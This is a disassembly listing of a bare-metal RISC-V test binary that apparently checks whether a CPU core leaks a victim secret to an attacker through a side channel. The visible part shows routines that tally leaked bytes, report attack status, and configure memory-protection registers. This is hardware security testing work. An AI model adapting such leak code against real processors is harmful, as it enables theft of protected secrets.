    10002444:	700c7597          	auipc	a1,0x700c7
    10002448:	c4c5b583          	ld	a1,-948(a1) # 800c9090 <trap_count>
    1000244c:	700c7517          	auipc	a0,0x700c7
    10002450:	c1c50513          	addi	a0,a0,-996 # 800c9068 <bad_trap_count>
    10002454:	6390                	ld	a2,0(a5)
    10002456:	700c7797          	auipc	a5,0x700c7
    1000245a:	c2a78793          	addi	a5,a5,-982 # 800c9080 <victim_done_count>
    1000245e:	6394                	ld	a3,0(a5)
    10002460:	700c7717          	auipc	a4,0x700c7
    10002464:	c1873703          	ld	a4,-1000(a4) # 800c9078 <flush_call_count>
    10002468:	700c7797          	auipc	a5,0x700c7
    1000246c:	c087b783          	ld	a5,-1016(a5) # 800c9070 <exit_call_count>
    10002470:	00053803          	ld	a6,0(a0)
    10002474:	700c7897          	auipc	a7,0x700c7
    10002478:	bec8b883          	ld	a7,-1044(a7) # 800c9060 <last_mcause>
    1000247c:	700c7517          	auipc	a0,0x700c7
    10002480:	bdc53503          	ld	a0,-1060(a0) # 800c9058 <last_mepc>
    10002484:	700c7317          	auipc	t1,0x700c7
    10002488:	bc832303          	lw	t1,-1080(t1) # 800c904c <attack_status>
    1000248c:	e02a                	sd	a0,0(sp)
    1000248e:	e41a                	sd	t1,8(sp)
    10002490:	00003517          	auipc	a0,0x3
    10002494:	0f050513          	addi	a0,a0,240 # 10005580 <printf_+0x83c>
    10002498:	0ad020ef          	jal	10004d44 <printf_>
    1000249c:	4785                	li	a5,1
    1000249e:	70005c97          	auipc	s9,0x70005
    100024a2:	b62c8c93          	addi	s9,s9,-1182 # 80007000 <leaked_idx>
    100024a6:	70011b17          	auipc	s6,0x70011
    100024aa:	b5ab0b13          	addi	s6,s6,-1190 # 80013000 <victim_secret>
    100024ae:	70006c17          	auipc	s8,0x70006
    100024b2:	b52c0c13          	addi	s8,s8,-1198 # 80008000 <leaked_top_score>
    100024b6:	70007917          	auipc	s2,0x70007
    100024ba:	b4a90913          	addi	s2,s2,-1206 # 80009000 <leaked_top_idx>
    100024be:	70004d97          	auipc	s11,0x70004
    100024c2:	b42d8d93          	addi	s11,s11,-1214 # 80006000 <leaked_score>
    100024c6:	70003a97          	auipc	s5,0x70003
    100024ca:	b3aa8a93          	addi	s5,s5,-1222 # 80005000 <rounds_used>
    100024ce:	f0be                	sd	a5,96(sp)
    100024d0:	05e00493          	li	s1,94
    100024d4:	4b99                	li	s7,6
    100024d6:	f4ce                	sd	s3,104(sp)
    100024d8:	a861                	j	10002570 <machine_low_return+0x1c8>
    100024da:	2681                	sext.w	a3,a3
    100024dc:	03f00613          	li	a2,63
    100024e0:	00194803          	lbu	a6,1(s2)
    100024e4:	000c3703          	ld	a4,0(s8)
    100024e8:	fe08059b          	addiw	a1,a6,-32
    100024ec:	0ff5f593          	zext.b	a1,a1
    100024f0:	2801                	sext.w	a6,a6
    100024f2:	87c2                	mv	a5,a6
    100024f4:	00b4f463          	bgeu	s1,a1,100024fc <machine_low_return+0x154>
    100024f8:	03f00793          	li	a5,63
    100024fc:	00294583          	lbu	a1,2(s2)
    10002500:	008c3883          	ld	a7,8(s8)
    10002504:	fe05851b          	addiw	a0,a1,-32
    10002508:	0ff57513          	zext.b	a0,a0
    1000250c:	2581                	sext.w	a1,a1
    1000250e:	8f2e                	mv	t5,a1
    10002510:	00a4f463          	bgeu	s1,a0,10002518 <machine_low_return+0x170>
    10002514:	03f00f13          	li	t5,63
    10002518:	00394503          	lbu	a0,3(s2)
    1000251c:	010c3283          	ld	t0,16(s8)
    10002520:	fe050e9b          	addiw	t4,a0,-32
    10002524:	0ffefe93          	zext.b	t4,t4
    10002528:	2501                	sext.w	a0,a0
    1000252a:	8faa                	mv	t6,a0
    1000252c:	01d4f463          	bgeu	s1,t4,10002534 <machine_low_return+0x18c>
    10002530:	03f00f93          	li	t6,63
    10002534:	018c3e83          	ld	t4,24(s8)
    10002538:	f02a                	sd	a0,32(sp)
    1000253a:	e42e                	sd	a1,8(sp)
    1000253c:	ec7e                	sd	t6,24(sp)
    1000253e:	f476                	sd	t4,40(sp)
    10002540:	e816                	sd	t0,16(sp)
    10002542:	e07a                	sd	t5,0(sp)
    10002544:	85a2                	mv	a1,s0
    10002546:	00003517          	auipc	a0,0x3
    1000254a:	17a50513          	addi	a0,a0,378 # 100056c0 <printf_+0x97c>
    1000254e:	7f6020ef          	jal	10004d44 <printf_>
    10002552:	01498563          	beq	s3,s4,1000255c <machine_low_return+0x1b4>
    10002556:	014d0363          	beq	s10,s4,1000255c <machine_low_return+0x1b4>
    1000255a:	f082                	sd	zero,96(sp)
    1000255c:	0405                	addi	s0,s0,1
    1000255e:	0c89                	addi	s9,s9,2
    10002560:	0b05                	addi	s6,s6,1
    10002562:	020c0c13          	addi	s8,s8,32
    10002566:	0911                	addi	s2,s2,4
    10002568:	0dc1                	addi	s11,s11,16
    1000256a:	0aa1                	addi	s5,s5,8
    1000256c:	09740663          	beq	s0,s7,100025f8 <machine_low_return+0x250>
    10002570:	000cc983          	lbu	s3,0(s9)
    10002574:	000b4a03          	lbu	s4,0(s6)
    10002578:	001ccd03          	lbu	s10,1(s9)
    1000257c:	fe09861b          	addiw	a2,s3,-32
    10002580:	0009879b          	sext.w	a5,s3
    10002584:	0ff67613          	zext.b	a2,a2
    10002588:	000a069b          	sext.w	a3,s4
    1000258c:	873e                	mv	a4,a5
    1000258e:	00c4f463          	bgeu	s1,a2,10002596 <machine_low_return+0x1ee>
    10002592:	03f00713          	li	a4,63
    10002596:	fe0d061b          	addiw	a2,s10,-32
    1000259a:	000d059b          	sext.w	a1,s10
    1000259e:	0ff67613          	zext.b	a2,a2
    100025a2:	000db803          	ld	a6,0(s11)
    100025a6:	88ae                	mv	a7,a1
    100025a8:	00c4f463          	bgeu	s1,a2,100025b0 <machine_low_return+0x208>
    100025ac:	03f00893          	li	a7,63
    100025b0:	008db603          	ld	a2,8(s11)
    100025b4:	00003517          	auipc	a0,0x3
    100025b8:	05c50513          	addi	a0,a0,92 # 10005610 <printf_+0x8cc>
    100025bc:	e02e                	sd	a1,0(sp)
    100025be:	e432                	sd	a2,8(sp)
    100025c0:	85a2                	mv	a1,s0
    100025c2:	8636                	mv	a2,a3
    100025c4:	780020ef          	jal	10004d44 <printf_>
    100025c8:	000ab603          	ld	a2,0(s5)
    100025cc:	4789                	li	a5,2
    100025ce:	4685                	li	a3,1
    100025d0:	470d                	li	a4,3
    100025d2:	85a2                	mv	a1,s0
    100025d4:	00003517          	auipc	a0,0x3
    100025d8:	0a450513          	addi	a0,a0,164 # 10005678 <printf_+0x934>
    100025dc:	768020ef          	jal	10004d44 <printf_>
    100025e0:	00094683          	lbu	a3,0(s2)
    100025e4:	fe06879b          	addiw	a5,a3,-32
    100025e8:	0ff7f793          	zext.b	a5,a5
    100025ec:	eef4e7e3          	bltu	s1,a5,100024da <machine_low_return+0x132>
    100025f0:	0006861b          	sext.w	a2,a3
    100025f4:	86b2                	mv	a3,a2
    100025f6:	b5ed                	j	100024e0 <machine_low_return+0x138>
    100025f8:	6fffe797          	auipc	a5,0x6fffe
    100025fc:	a0878793          	addi	a5,a5,-1528 # 80000000 <direct_victim_fault_seen>
    10002600:	639c                	ld	a5,0(a5)
    10002602:	79a6                	ld	s3,104(sp)
    10002604:	c79d                	beqz	a5,10002632 <machine_low_return+0x28a>
    10002606:	6ffff797          	auipc	a5,0x6ffff
    1000260a:	9fa78793          	addi	a5,a5,-1542 # 80001000 <direct_victim_read_completed>
    1000260e:	639c                	ld	a5,0(a5)
    10002610:	e38d                	bnez	a5,10002632 <machine_low_return+0x28a>
    10002612:	700c7797          	auipc	a5,0x700c7
    10002616:	a1e78793          	addi	a5,a5,-1506 # 800c9030 <observed_attacker_satp>
    1000261a:	639c                	ld	a5,0(a5)
    1000261c:	0ffff737          	lui	a4,0xffff
    10002620:	700c7697          	auipc	a3,0x700c7
    10002624:	a086b683          	ld	a3,-1528(a3) # 800c9028 <observed_victim_satp>
    10002628:	1702                	slli	a4,a4,0x20
    1000262a:	8fb5                	xor	a5,a5,a3
    1000262c:	8ff9                	and	a5,a5,a4
    1000262e:	00f039b3          	snez	s3,a5
    10002632:	700c7797          	auipc	a5,0x700c7
    10002636:	a1a7a783          	lw	a5,-1510(a5) # 800c904c <attack_status>
    1000263a:	0007841b          	sext.w	s0,a5
    1000263e:	ef89                	bnez	a5,10002658 <machine_low_return+0x2b0>
    10002640:	700c7797          	auipc	a5,0x700c7
    10002644:	a2878793          	addi	a5,a5,-1496 # 800c9068 <bad_trap_count>
    10002648:	639c                	ld	a5,0(a5)
    1000264a:	e799                	bnez	a5,10002658 <machine_low_return+0x2b0>
    1000264c:	700c7697          	auipc	a3,0x700c7
    10002650:	a3c68693          	addi	a3,a3,-1476 # 800c9088 <victim_call_count>
    10002654:	629c                	ld	a5,0(a3)
    10002656:	ef85                	bnez	a5,1000268e <machine_low_return+0x2e6>
    10002658:	4405                	li	s0,1
    1000265a:	00002597          	auipc	a1,0x2
    1000265e:	75e58593          	addi	a1,a1,1886 # 10004db8 <printf_+0x74>
    10002662:	00003517          	auipc	a0,0x3
    10002666:	0b650513          	addi	a0,a0,182 # 10005718 <printf_+0x9d4>
    1000266a:	6da020ef          	jal	10004d44 <printf_>
    1000266e:	70ae                	ld	ra,232(sp)
    10002670:	8522                	mv	a0,s0
    10002672:	740e                	ld	s0,224(sp)
    10002674:	64ee                	ld	s1,216(sp)
    10002676:	694e                	ld	s2,208(sp)
    10002678:	69ae                	ld	s3,200(sp)
    1000267a:	6a0e                	ld	s4,192(sp)
    1000267c:	7aea                	ld	s5,184(sp)
    1000267e:	7b4a                	ld	s6,176(sp)
    10002680:	7baa                	ld	s7,168(sp)
    10002682:	7c0a                	ld	s8,160(sp)
    10002684:	6cea                	ld	s9,152(sp)
    10002686:	6d4a                	ld	s10,144(sp)
    10002688:	6daa                	ld	s11,136(sp)
    1000268a:	616d                	addi	sp,sp,240
    1000268c:	8082                	ret
    1000268e:	700c7797          	auipc	a5,0x700c7
    10002692:	9f278793          	addi	a5,a5,-1550 # 800c9080 <victim_done_count>
    10002696:	6398                	ld	a4,0(a5)
    10002698:	629c                	ld	a5,0(a3)
    1000269a:	faf71fe3          	bne	a4,a5,10002658 <machine_low_return+0x2b0>
    1000269e:	fa098de3          	beqz	s3,10002658 <machine_low_return+0x2b0>
    100026a2:	7786                	ld	a5,96(sp)
    100026a4:	00002597          	auipc	a1,0x2
    100026a8:	70458593          	addi	a1,a1,1796 # 10004da8 <printf_+0x64>
    100026ac:	fbdd                	bnez	a5,10002662 <machine_low_return+0x2ba>
    100026ae:	b76d                	j	10002658 <machine_low_return+0x2b0>
    100026b0:	00003517          	auipc	a0,0x3
    100026b4:	9e050513          	addi	a0,a0,-1568 # 10005090 <printf_+0x34c>
    100026b8:	ad7fd0ef          	jal	1000018e <putstr>
    100026bc:	00003517          	auipc	a0,0x3
    100026c0:	d0450513          	addi	a0,a0,-764 # 100053c0 <printf_+0x67c>
    100026c4:	acbfd0ef          	jal	1000018e <putstr>
    100026c8:	00003517          	auipc	a0,0x3
    100026cc:	d1050513          	addi	a0,a0,-752 # 100053d8 <printf_+0x694>
    100026d0:	abffd0ef          	jal	1000018e <putstr>
    100026d4:	4505                	li	a0,1
    100026d6:	0f8000ef          	jal	100027ce <_halt>
    100026da:	00003517          	auipc	a0,0x3
    100026de:	9b650513          	addi	a0,a0,-1610 # 10005090 <printf_+0x34c>
    100026e2:	aadfd0ef          	jal	1000018e <putstr>
    100026e6:	00003517          	auipc	a0,0x3
    100026ea:	c3a50513          	addi	a0,a0,-966 # 10005320 <printf_+0x5dc>
    100026ee:	aa1fd0ef          	jal	1000018e <putstr>
    100026f2:	00003517          	auipc	a0,0x3
    100026f6:	c4e50513          	addi	a0,a0,-946 # 10005340 <printf_+0x5fc>
    100026fa:	a95fd0ef          	jal	1000018e <putstr>
    100026fe:	4505                	li	a0,1
    10002700:	0ce000ef          	jal	100027ce <_halt>
    10002704:	00003517          	auipc	a0,0x3
    10002708:	98c50513          	addi	a0,a0,-1652 # 10005090 <printf_+0x34c>
    1000270c:	a83fd0ef          	jal	1000018e <putstr>
    10002710:	00003517          	auipc	a0,0x3
    10002714:	b7050513          	addi	a0,a0,-1168 # 10005280 <printf_+0x53c>
    10002718:	a77fd0ef          	jal	1000018e <putstr>
    1000271c:	00003517          	auipc	a0,0x3
    10002720:	b8450513          	addi	a0,a0,-1148 # 100052a0 <printf_+0x55c>
    10002724:	a6bfd0ef          	jal	1000018e <putstr>
    10002728:	4505                	li	a0,1
    1000272a:	0a4000ef          	jal	100027ce <_halt>
    1000272e:	00003517          	auipc	a0,0x3
    10002732:	96250513          	addi	a0,a0,-1694 # 10005090 <printf_+0x34c>
    10002736:	a59fd0ef          	jal	1000018e <putstr>
    1000273a:	00003517          	auipc	a0,0x3
    1000273e:	aa650513          	addi	a0,a0,-1370 # 100051e0 <printf_+0x49c>
    10002742:	a4dfd0ef          	jal	1000018e <putstr>
    10002746:	00003517          	auipc	a0,0x3
    1000274a:	aba50513          	addi	a0,a0,-1350 # 10005200 <printf_+0x4bc>
    1000274e:	a41fd0ef          	jal	1000018e <putstr>
    10002752:	4505                	li	a0,1
    10002754:	07a000ef          	jal	100027ce <_halt>
    10002758:	00003517          	auipc	a0,0x3
    1000275c:	93850513          	addi	a0,a0,-1736 # 10005090 <printf_+0x34c>
    10002760:	a2ffd0ef          	jal	1000018e <putstr>
    10002764:	00003517          	auipc	a0,0x3
    10002768:	9dc50513          	addi	a0,a0,-1572 # 10005140 <printf_+0x3fc>
    1000276c:	a23fd0ef          	jal	1000018e <putstr>
    10002770:	00003517          	auipc	a0,0x3
    10002774:	9f050513          	addi	a0,a0,-1552 # 10005160 <printf_+0x41c>
    10002778:	a17fd0ef          	jal	1000018e <putstr>
    1000277c:	4505                	li	a0,1
    1000277e:	050000ef          	jal	100027ce <_halt>
    10002782:	00003517          	auipc	a0,0x3
    10002786:	90e50513          	addi	a0,a0,-1778 # 10005090 <printf_+0x34c>
    1000278a:	a05fd0ef          	jal	1000018e <putstr>
    1000278e:	00003517          	auipc	a0,0x3
    10002792:	91250513          	addi	a0,a0,-1774 # 100050a0 <printf_+0x35c>
    10002796:	9f9fd0ef          	jal	1000018e <putstr>
    1000279a:	00003517          	auipc	a0,0x3
    1000279e:	92650513          	addi	a0,a0,-1754 # 100050c0 <printf_+0x37c>
    100027a2:	9edfd0ef          	jal	1000018e <putstr>
    100027a6:	4505                	li	a0,1
    100027a8:	026000ef          	jal	100027ce <_halt>

Disassembly of section .text._putc:

00000000100027ac <_putc>:
    100027ac:	1101                	addi	sp,sp,-32
    100027ae:	ec06                	sd	ra,24(sp)
    100027b0:	e822                	sd	s0,16(sp)
    100027b2:	1000                	addi	s0,sp,32
    100027b4:	87aa                	mv	a5,a0
    100027b6:	fef407a3          	sb	a5,-17(s0)
    100027ba:	fef44783          	lbu	a5,-17(s0)
    100027be:	853e                	mv	a0,a5
    100027c0:	16c000ef          	jal	1000292c <__am_uartlite_putchar>
    100027c4:	0001                	nop
    100027c6:	60e2                	ld	ra,24(sp)
    100027c8:	6442                	ld	s0,16(sp)
    100027ca:	6105                	addi	sp,sp,32
    100027cc:	8082                	ret

Disassembly of section .text._halt:

00000000100027ce <_halt>:
    100027ce:	1101                	addi	sp,sp,-32
    100027d0:	ec06                	sd	ra,24(sp)
    100027d2:	e822                	sd	s0,16(sp)
    100027d4:	1000                	addi	s0,sp,32
    100027d6:	87aa                	mv	a5,a0
    100027d8:	fef42623          	sw	a5,-20(s0)
    100027dc:	fec42783          	lw	a5,-20(s0)
    100027e0:	853e                	mv	a0,a5
    100027e2:	0005006b          	.word	0x0005006b
    100027e6:	fec42783          	lw	a5,-20(s0)
    100027ea:	85be                	mv	a1,a5
    100027ec:	00003517          	auipc	a0,0x3
    100027f0:	f4450513          	addi	a0,a0,-188 # 10005730 <printf_+0x9ec>
    100027f4:	550020ef          	jal	10004d44 <printf_>
    100027f8:	0001                	nop
    100027fa:	bffd                	j	100027f8 <_halt+0x2a>

Disassembly of section .text._copy_data:

00000000100027fc <_copy_data>:
    100027fc:	1101                	addi	sp,sp,-32
    100027fe:	ec22                	sd	s0,24(sp)
    10002800:	1000                	addi	s0,sp,32
    10002802:	00003797          	auipc	a5,0x3
    10002806:	32e78793          	addi	a5,a5,814 # 10005b30 <_sidata>
    1000280a:	fef43423          	sd	a5,-24(s0)
    1000280e:	6fffd797          	auipc	a5,0x6fffd
    10002812:	7f278793          	addi	a5,a5,2034 # 80000000 <direct_victim_fault_seen>
    10002816:	fef43023          	sd	a5,-32(s0)
    1000281a:	a01d                	j	10002840 <_copy_data+0x44>
    1000281c:	fe843783          	ld	a5,-24(s0)
    10002820:	0007c703          	lbu	a4,0(a5)
    10002824:	fe043783          	ld	a5,-32(s0)
    10002828:	00e78023          	sb	a4,0(a5)
    1000282c:	fe843783          	ld	a5,-24(s0)
    10002830:	0785                	addi	a5,a5,1
    10002832:	fef43423          	sd	a5,-24(s0)
    10002836:	fe043783          	ld	a5,-32(s0)
    1000283a:	0785                	addi	a5,a5,1
    1000283c:	fef43023          	sd	a5,-32(s0)
    10002840:	fe043703          	ld	a4,-32(s0)
    10002844:	6fffd797          	auipc	a5,0x6fffd
    10002848:	7bc78793          	addi	a5,a5,1980 # 80000000 <direct_victim_fault_seen>
    1000284c:	fcf718e3          	bne	a4,a5,1000281c <_copy_data+0x20>
    10002850:	0001                	nop
    10002852:	0001                	nop
    10002854:	6462                	ld	s0,24(sp)
    10002856:	6105                	addi	sp,sp,32
    10002858:	8082                	ret

Disassembly of section .text._init_bss:

000000001000285a <_init_bss>:
    1000285a:	1101                	addi	sp,sp,-32
    1000285c:	ec22                	sd	s0,24(sp)
    1000285e:	1000                	addi	s0,sp,32
    10002860:	7001e797          	auipc	a5,0x7001e
    10002864:	7a078793          	addi	a5,a5,1952 # 80021000 <victim_space>
    10002868:	fef43423          	sd	a5,-24(s0)
    1000286c:	a811                	j	10002880 <_init_bss+0x26>
    1000286e:	fe843783          	ld	a5,-24(s0)
    10002872:	00078023          	sb	zero,0(a5)
    10002876:	fe843783          	ld	a5,-24(s0)
    1000287a:	0785                	addi	a5,a5,1
    1000287c:	fef43423          	sd	a5,-24(s0)
    10002880:	fe843703          	ld	a4,-24(s0)
    10002884:	700c7797          	auipc	a5,0x700c7
    10002888:	81478793          	addi	a5,a5,-2028 # 800c9098 <_bss_end>
    1000288c:	fef711e3          	bne	a4,a5,1000286e <_init_bss+0x14>
    10002890:	0001                	nop
    10002892:	0001                	nop
    10002894:	6462                	ld	s0,24(sp)
    10002896:	6105                	addi	sp,sp,32
    10002898:	8082                	ret

Disassembly of section .text._trm_init:

000000001000289a <_trm_init>:
    1000289a:	1101                	addi	sp,sp,-32
    1000289c:	ec06                	sd	ra,24(sp)
    1000289e:	e822                	sd	s0,16(sp)
    100028a0:	1000                	addi	s0,sp,32
    100028a2:	f5bff0ef          	jal	100027fc <_copy_data>
    100028a6:	fb5ff0ef          	jal	1000285a <_init_bss>
    100028aa:	062000ef          	jal	1000290c <__am_init_uartlite>
    100028ae:	00003517          	auipc	a0,0x3
    100028b2:	e9750513          	addi	a0,a0,-361 # 10005745 <__am_mainargs>
    100028b6:	f4cff0ef          	jal	10002002 <main>
    100028ba:	87aa                	mv	a5,a0
    100028bc:	fef42623          	sw	a5,-20(s0)
    100028c0:	fec42783          	lw	a5,-20(s0)
    100028c4:	853e                	mv	a0,a5
    100028c6:	f09ff0ef          	jal	100027ce <_halt>

Disassembly of section .text.inb:

00000000100028ca <inb>:
    100028ca:	1101                	addi	sp,sp,-32
    100028cc:	ec22                	sd	s0,24(sp)
    100028ce:	1000                	addi	s0,sp,32
    100028d0:	fea43423          	sd	a0,-24(s0)
    100028d4:	fe843783          	ld	a5,-24(s0)
    100028d8:	0007c783          	lbu	a5,0(a5)
    100028dc:	0ff7f793          	zext.b	a5,a5
    100028e0:	853e                	mv	a0,a5
    100028e2:	6462                	ld	s0,24(sp)
    100028e4:	6105                	addi	sp,sp,32
    100028e6:	8082                	ret

Disassembly of section .text.outb:

00000000100028e8 <outb>:
    100028e8:	1101                	addi	sp,sp,-32
    100028ea:	ec22                	sd	s0,24(sp)
    100028ec:	1000                	addi	s0,sp,32
    100028ee:	fea43423          	sd	a0,-24(s0)
    100028f2:	87ae                	mv	a5,a1
    100028f4:	fef403a3          	sb	a5,-25(s0)
    100028f8:	fe843783          	ld	a5,-24(s0)
    100028fc:	fe744703          	lbu	a4,-25(s0)
    10002900:	00e78023          	sb	a4,0(a5)
    10002904:	0001                	nop
    10002906:	6462                	ld	s0,24(sp)
    10002908:	6105                	addi	sp,sp,32
    1000290a:	8082                	ret

Disassembly of section .text.__am_init_uartlite:

000000001000290c <__am_init_uartlite>:
    1000290c:	1141                	addi	sp,sp,-16
    1000290e:	e406                	sd	ra,8(sp)
    10002910:	e022                	sd	s0,0(sp)
    10002912:	0800                	addi	s0,sp,16
    10002914:	458d                	li	a1,3
    10002916:	406007b7          	lui	a5,0x40600
    1000291a:	00c78513          	addi	a0,a5,12 # 4060000c <_sibss+0x305d94dc>
    1000291e:	fcbff0ef          	jal	100028e8 <outb>
    10002922:	0001                	nop
    10002924:	60a2                	ld	ra,8(sp)
    10002926:	6402                	ld	s0,0(sp)
    10002928:	0141                	addi	sp,sp,16
    1000292a:	8082                	ret

Disassembly of section .text.__am_uartlite_putchar:

000000001000292c <__am_uartlite_putchar>:
    1000292c:	1101                	addi	sp,sp,-32
    1000292e:	ec06                	sd	ra,24(sp)
    10002930:	e822                	sd	s0,16(sp)
    10002932:	1000                	addi	s0,sp,32
    10002934:	87aa                	mv	a5,a0
    10002936:	fef407a3          	sb	a5,-17(s0)
    1000293a:	fef44783          	lbu	a5,-17(s0)
    1000293e:	0ff7f713          	zext.b	a4,a5
    10002942:	47a9                	li	a5,10
    10002944:	00f71563          	bne	a4,a5,1000294e <__am_uartlite_putchar+0x22>
    10002948:	4535                	li	a0,13
    1000294a:	fe3ff0ef          	jal	1000292c <__am_uartlite_putchar>
    1000294e:	0001                	nop
    10002950:	406007b7          	lui	a5,0x40600
    10002954:	00878513          	addi	a0,a5,8 # 40600008 <_sibss+0x305d94d8>
    10002958:	f73ff0ef          	jal	100028ca <inb>
    1000295c:	87aa                	mv	a5,a0
    1000295e:	2781                	sext.w	a5,a5
    10002960:	8ba1                	andi	a5,a5,8
    10002962:	2781                	sext.w	a5,a5
    10002964:	f7f5                	bnez	a5,10002950 <__am_uartlite_putchar+0x24>
    10002966:	fef44783          	lbu	a5,-17(s0)
    1000296a:	85be                	mv	a1,a5
    1000296c:	406007b7          	lui	a5,0x40600
    10002970:	00478513          	addi	a0,a5,4 # 40600004 <_sibss+0x305d94d4>
    10002974:	f75ff0ef          	jal	100028e8 <outb>
    10002978:	0001                	nop
    1000297a:	60e2                	ld	ra,24(sp)
    1000297c:	6442                	ld	s0,16(sp)
    1000297e:	6105                	addi	sp,sp,32
    10002980:	8082                	ret

Disassembly of section .text.csr_write_num:

0000000010002982 <csr_write_num>:
    10002982:	d6010113          	addi	sp,sp,-672
    10002986:	28813c23          	sd	s0,664(sp)
    1000298a:	1500                	addi	s0,sp,672
    1000298c:	87aa                	mv	a5,a0
    1000298e:	d6b43023          	sd	a1,-672(s0)
    10002992:	d6f42623          	sw	a5,-660(s0)
    10002996:	d6c42783          	lw	a5,-660(s0)
    1000299a:	c607869b          	addiw	a3,a5,-928
    1000299e:	0006871b          	sext.w	a4,a3
    100029a2:	04f00793          	li	a5,79
    100029a6:	5ce7e463          	bltu	a5,a4,10002f6e <csr_write_num+0x5ec>
    100029aa:	080687bb          	zext.w	a5,a3
    100029ae:	00279713          	slli	a4,a5,0x2
    100029b2:	00003797          	auipc	a5,0x3
    100029b6:	d9678793          	addi	a5,a5,-618 # 10005748 <__am_mainargs+0x3>
    100029ba:	97ba                	add	a5,a5,a4
    100029bc:	439c                	lw	a5,0(a5)
    100029be:	0007871b          	sext.w	a4,a5
    100029c2:	00003797          	auipc	a5,0x3
    100029c6:	d8678793          	addi	a5,a5,-634 # 10005748 <__am_mainargs+0x3>
    100029ca:	97ba                	add	a5,a5,a4
    100029cc:	8782                	jr	a5
    100029ce:	d6043783          	ld	a5,-672(s0)
    100029d2:	d6f43823          	sd	a5,-656(s0)
    100029d6:	d7043783          	ld	a5,-656(s0)
    100029da:	3a079073          	csrw	pmpcfg0,a5
    100029de:	ab41                	j	10002f6e <csr_write_num+0x5ec>
    100029e0:	d6043783          	ld	a5,-672(s0)
    100029e4:	d6f43c23          	sd	a5,-648(s0)
    100029e8:	d7843783          	ld	a5,-648(s0)
    100029ec:	3a179073          	csrw	pmpcfg1,a5
    100029f0:	abbd                	j	10002f6e <csr_write_num+0x5ec>
    100029f2:	d6043783          	ld	a5,-672(s0)
    100029f6:	d8f43023          	sd	a5,-640(s0)
    100029fa:	d8043783          	ld	a5,-640(s0)
    100029fe:	3a279073          	csrw	pmpcfg2,a5
    10002a02:	a3b5                	j	10002f6e <csr_write_num+0x5ec>
    10002a04:	d6043783          	ld	a5,-672(s0)
    10002a08:	d8f43423          	sd	a5,-632(s0)
    10002a0c:	d8843783          	ld	a5,-632(s0)
    10002a10:	3a379073          	csrw	pmpcfg3,a5
    10002a14:	aba9                	j	10002f6e <csr_write_num+0x5ec>
    10002a16:	d6043783          	ld	a5,-672(s0)
    10002a1a:	d8f43823          	sd	a5,-624(s0)
    10002a1e:	d9043783          	ld	a5,-624(s0)
    10002a22:	3a479073          	csrw	0x3a4,a5
    10002a26:	a3a1                	j	10002f6e <csr_write_num+0x5ec>
    10002a28:	d6043783          	ld	a5,-672(s0)
    10002a2c:	d8f43c23          	sd	a5,-616(s0)
    10002a30:	d9843783          	ld	a5,-616(s0)
    10002a34:	3a579073          	csrw	0x3a5,a5
    10002a38:	ab1d                	j	10002f6e <csr_write_num+0x5ec>
    10002a3a:	d6043783          	ld	a5,-672(s0)
    10002a3e:	daf43023          	sd	a5,-608(s0)
    10002a42:	da043783          	ld	a5,-608(s0)
    10002a46:	3a679073          	csrw	0x3a6,a5
    10002a4a:	a315                	j	10002f6e <csr_write_num+0x5ec>
    10002a4c:	d6043783          	ld	a5,-672(s0)
    10002a50:	daf43423          	sd	a5,-600(s0)
    10002a54:	da843783          	ld	a5,-600(s0)
    10002a58:	3a779073          	csrw	0x3a7,a5
    10002a5c:	ab09                	j	10002f6e <csr_write_num+0x5ec>
    10002a5e:	d6043783          	ld	a5,-672(s0)
    10002a62:	daf43823          	sd	a5,-592(s0)
    10002a66:	db043783          	ld	a5,-592(s0)
    10002a6a:	3a879073          	csrw	0x3a8,a5
    10002a6e:	a301                	j	10002f6e <csr_write_num+0x5ec>
    10002a70:	d6043783          	ld	a5,-672(s0)
    10002a74:	daf43c23          	sd	a5,-584(s0)
    10002a78:	db843783          	ld	a5,-584(s0)
    10002a7c:	3a979073          	csrw	0x3a9,a5
    10002a80:	a1fd                	j	10002f6e <csr_write_num+0x5ec>
    10002a82:	d6043783          	ld	a5,-672(s0)
    10002a86:	dcf43023          	sd	a5,-576(s0)
    10002a8a:	dc043783          	ld	a5,-576(s0)
    10002a8e:	3aa79073          	csrw	0x3aa,a5
    10002a92:	a9f1                	j	10002f6e <csr_write_num+0x5ec>
    10002a94:	d6043783          	ld	a5,-672(s0)
    10002a98:	dcf43423          	sd	a5,-568(s0)
    10002a9c:	dc843783          	ld	a5,-568(s0)
    10002aa0:	3ab79073          	csrw	0x3ab,a5
    10002aa4:	a1e9                	j	10002f6e <csr_write_num+0x5ec>
    10002aa6:	d6043783          	ld	a5,-672(s0)
    10002aaa:	dcf43823          	sd	a5,-560(s0)
    10002aae:	dd043783          	ld	a5,-560(s0)
    10002ab2:	3ac79073          	csrw	0x3ac,a5
    10002ab6:	a965                	j	10002f6e <csr_write_num+0x5ec>
    10002ab8:	d6043783          	ld	a5,-672(s0)
    10002abc:	dcf43c23          	sd	a5,-552(s0)
    10002ac0:	dd843783          	ld	a5,-552(s0)
    10002ac4:	3ad79073          	csrw	0x3ad,a5
    10002ac8:	a15d                	j	10002f6e <csr_write_num+0x5ec>
    10002aca:	d6043783          	ld	a5,-672(s0)
    10002ace:	def43023          	sd	a5,-544(s0)
    10002ad2:	de043783          	ld	a5,-544(s0)
    10002ad6:	3ae79073          	csrw	0x3ae,a5
    10002ada:	a951                	j	10002f6e <csr_write_num+0x5ec>
    10002adc:	d6043783          	ld	a5,-672(s0)
    10002ae0:	def43423          	sd	a5,-536(s0)
    10002ae4:	de843783          	ld	a5,-536(s0)
    10002ae8:	3af79073          	csrw	0x3af,a5
    10002aec:	a149                	j	10002f6e <csr_write_num+0x5ec>
    10002aee:	d6043783          	ld	a5,-672(s0)
    10002af2:	def43823          	sd	a5,-528(s0)
    10002af6:	df043783          	ld	a5,-528(s0)
    10002afa:	3b079073          	csrw	pmpaddr0,a5
    10002afe:	a985                	j	10002f6e <csr_write_num+0x5ec>
    10002b00:	d6043783          	ld	a5,-672(s0)
    10002b04:	def43c23          	sd	a5,-520(s0)
    10002b08:	df843783          	ld	a5,-520(s0)
    10002b0c:	3b179073          	csrw	pmpaddr1,a5
    10002b10:	a9b9                	j	10002f6e <csr_write_num+0x5ec>
    10002b12:	d6043783          	ld	a5,-672(s0)
    10002b16:	e0f43023          	sd	a5,-512(s0)
    10002b1a:	e0043783          	ld	a5,-512(s0)
    10002b1e:	3b279073          	csrw	pmpaddr2,a5
    10002b22:	a1b1                	j	10002f6e <csr_write_num+0x5ec>
    10002b24:	d6043783          	ld	a5,-672(s0)
    10002b28:	e0f43423          	sd	a5,-504(s0)
    10002b2c:	e0843783          	ld	a5,-504(s0)
